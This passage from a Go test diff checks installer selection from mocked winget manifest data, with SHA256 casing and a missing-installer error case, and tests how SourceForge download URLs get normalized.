+			bytes, err := yaml.Marshal(v)
+			if err != nil {
+				t.Errorf("marshaling fixture: %v", err)
+				return
+			}
+			str := string(bytes)
+			content := &github.RepositoryContent{Name: new("Foo"), Content: &str}
+			if err := json.NewEncoder(w).Encode(content); err != nil {
+				t.Errorf("encoding fixture: %v", err)
+			}
+		}
+
+		switch r.URL.Path {
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo":
+			content := []github.RepositoryContent{{Name: new("1.0"), Type: new("dir")}}
+			if err := json.NewEncoder(w).Encode(content); err != nil {
+				t.Errorf("encoding fixture: %v", err)
+			}
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo/1.0/Foo.installer.yaml":
+			writeYAMLContent(installerManifest{
+				InstallerType:  "zip",
+				PackageVersion: "1.0",
+				Installers: []installer{
+					{Architecture: "x64", NestedInstallerType: "exe", Scope: "machine", InstallerURL: "https://example.com/foo.install.zip", InstallerSha256: "AAAA"},
+					{Architecture: "x64", NestedInstallerType: "wix", Scope: "machine", InstallerURL: "https://example.com/foo.msi.zip", InstallerSha256: "BBBB"},
+				},
+			})
+
+		case "/repos/microsoft/winget-pkgs/contents/manifests/f/Foo/1.0/Foo.locale.en-US.yaml":
+			writeYAMLContent(localeManifest{PackageName: "foo", Publisher: "Bar, Inc."})
+
+		default:
+			w.WriteHeader(http.StatusBadRequest)
+			t.Errorf("unexpected path %s", r.URL.Path)
+		}
+	}))
+	t.Cleanup(srv.Close)
+
+	gc := github.NewClient(srv.Client())
+	u, err := url.Parse(srv.URL + "/")
+	require.NoError(t, err)
+	gc.BaseURL = u
+	i := &wingetIngester{logger: slog.New(slog.DiscardHandler), githubClient: gc}
+
+	input := inputApp{
+		Name:                "Foo",
+		UniqueIdentifier:    "Foo",
+		PackageIdentifier:   "Foo",
+		Slug:                "foo/windows",
+		InstallerArch:       "x64",
+		InstallerType:       "zip",
+		InstallerScope:      "machine",
+		InstallScriptPath:   installScript,
+		UninstallScriptPath: uninstallScript,
+	}
+
+	out, err := i.ingestOne(ctx, input)
+	require.NoError(t, err)
+	require.Equal(t, "https://example.com/foo.install.zip", out.InstallerURL, "without a filter the first match wins")
+
+	input.NestedInstallerType = "wix"
+	out, err = i.ingestOne(ctx, input)
+	require.NoError(t, err)
+	require.Equal(t, "https://example.com/foo.msi.zip", out.InstallerURL)
+	require.Equal(t, "bbbb", out.SHA256)
+
+	input.NestedInstallerType = "msix"
+	_, err = i.ingestOne(ctx, input)
+	require.ErrorContains(t, err, "failed to find installer for app")
+}
+
+func TestNormalizeSourceForgeURL(t *testing.T) {
+	tests := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{
+			// CrystalDiskMark's manifest omits the suffix, so a bare fetch gets
+			// SourceForge's HTML landing page instead of the installer.
+			name: "project file URL gets the download suffix",
+			in:   "https://sourceforge.net/projects/crystaldiskmark/files/9.0.3/CrystalDiskMark9_0_3.exe",
+			want: "https://sourceforge.net/projects/crystaldiskmark/files/9.0.3/CrystalDiskMark9_0_3.exe/download",
+		},
+		{
+			name: "already suffixed URL is left alone",
+			in:   "https://sourceforge.net/projects/winscp/files/WinSCP/6.5.6/WinSCP-6.5.6-Setup.exe/download",
+			want: "https://sourceforge.net/projects/winscp/files/WinSCP/6.5.6/WinSCP-6.5.6-Setup.exe/download",
+		},
+		{
+			name: "www host is normalized too",
+			in:   "https://www.sourceforge.net/projects/foo/files/bar.exe",
+			want: "https://www.sourceforge.net/projects/foo/files/bar.exe/download",
+		},
+		{
+			// This host serves the bytes directly; a suffix would 404.
+			name: "downloads subdomain is untouched",
+			in:   "https://downloads.sourceforge.net/project/crystaldiskmark/9.0.3/CrystalDiskMark9_0_3.exe",
+			want: "https://downloads.sourceforge.net/project/crystaldiskmark/9.0.3/CrystalDiskMark9_0_3.exe",
+		},
+		{
+			name: "non-file sourceforge path is untouched",
+			in:   "https://sourceforge.net/projects/crystaldiskmark/",
+			want: "https://sourceforge.net/projects/crystaldiskmark/",
+		},
+		{
+			name: "other hosts are untouched",
+			in:   "https://github.com/owner/repo/releases/download/v1/app.exe",
+			want: "https://github.com/owner/repo/releases/download/v1/app.exe",
+		},
+		{
+			name: "query string is preserved",
+			in:   "https://sourceforge.net/projects/foo/files/bar.exe?use_mirror=psychz",
+			want: "https://sourceforge.net/projects/foo/files/bar.exe/download?use_mirror=psychz",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			assert.Equal(t, tt.want, normalizeSourceForgeURL(tt.in))
+		})
+	}
+}
